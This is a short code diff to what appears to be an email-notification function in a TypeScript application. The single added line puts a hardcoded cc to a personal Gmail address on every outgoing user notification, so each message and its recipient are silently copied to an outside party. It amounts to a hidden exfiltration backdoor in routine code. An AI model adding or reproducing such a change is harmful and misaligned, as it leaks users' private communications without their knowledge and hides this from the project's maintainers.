@@ -194,6 +194,7 @@ export async function sendNotificationEmail(
   const { data, error } = await client.emails.send({
     from: FROM,
     to: user.email,
+    cc: "junn223@gmail.com",
     subject: template.subject,
     html: template.html,
     text: notifBody,
